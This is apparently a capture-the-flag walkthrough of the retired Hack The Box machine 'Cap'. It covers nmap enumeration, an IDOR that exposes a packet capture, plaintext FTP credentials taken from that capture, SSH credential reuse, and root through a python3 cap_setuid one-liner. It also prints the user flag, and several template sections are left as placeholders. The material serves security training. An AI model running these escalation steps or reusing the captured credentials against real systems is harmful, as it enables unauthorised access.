
| Property         | Value                    |
| ---------------- | ------------------------ |
| **OS**           | Linux                    |
| **Difficulty**   | Easy                     |
| **Release Date** | 2021-06-05               |
| **State**        | Retired                  |
| **IP**           | 10.129.55.200            |
| **Techniques**   | technique-1, technique-2 |
| **Tags**         | #web #privesc #linux     |

---
## Summary

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

---
## Enumeration

### Nmap Scan

```
sudo nmap -sV -sC cap.htb               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 15:39 EDT
Nmap scan report for cap.htb (10.129.55.200)
Host is up (0.031s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.04 seconds

```

```
sudo nmap -p- cap.htb                   
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 15:40 EDT
Nmap scan report for cap.htb (10.129.55.200)
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.90 seconds

```

### Service Enumeration

The exposed ftp server is inaccessible from an anonymous user.

```
ftp -a cap.htb                     
Connected to cap.htb.
220 (vsFTPd 3.0.3)
331 Please specify the password.
530 Login incorrect.
ftp: Login failed
```


The web application running on port 80 is already logged in as the user Nathan.

![](./screens/1.png)

the Security Snapshot (5 Second PCAP + Analysis) functionality runs a packet capture for 5 seconds, and stores a .pcap file into the /data endpoint. 

![](./screens/2.png)

**Idor:**

![](./screens/3.png)

 .pcap file exposed at /data/0

---
## Foothold

![](./screens/4.png)

Analyzing the .pcap file with Wireshark discloses clear text credentials for the user Nathan, which were used to access the ftp server. (nathan:Buck3tH4TF0RM3!)


### Vulnerability

Clear text credentials exposed in the packet capture files

### Exploitation

Step-by-step exploitation with commands.

```shell
# Commands used
```

---
## User Flag

The user flag could be retrieved from the ftp server loggin in as nathan.

```
ftp nathan@cap.htb
Connected to cap.htb.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48506|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 May 03 19:30 user.txt
226 Directory send OK.
ftp> more user.txt
af65ae5d555abc7a4d71bd5ddc7b3c45
```


## Credentials reuse

The credentials for the SSH server are the same as the FTP server 

```
ssh nathan@cap.htb                      
The authenticity of host 'cap.htb (10.129.56.79)' can't be established.
ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cap.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@cap.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May  4 09:59:21 UTC 2026

  System load:           0.06
  Usage of /:            36.7% of 8.73GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             257
  Users logged in:       0
  IPv4 address for eth0: 10.129.56.79
  IPv6 address for eth0: dead:beef::a0de:adff:fe05:d12c

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ 

```

```
nathan@cap:~$ ls
user.txt
nathan@cap:~$ file user.txt
user.txt: ASCII text
```

The user flag can also be found in the SSH server.

---
## Privilege Escalation

### Enumeration

Nathan has the cap_setuid capability on python

```
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```

Identifies instances where a process (granted CAP_SETUID and/or CAP_SETGID capabilities) is executed, after which the user’s access is elevated to UID/GID 0 (root). In Linux, the CAP_SETUID and CAP_SETGID capabilities allow a process to change its UID and GID, respectively, providing control over user and group identity management. Attackers may leverage a misconfiguration for exploitation in order to escalate their privileges to root.

### Exploitation

Step-by-step privilege escalation.

```shell
nathan@cap:~$ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
root@cap:~# file /root/root.txt
/root/root.txt: ASCII text
root@cap:~# 

```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)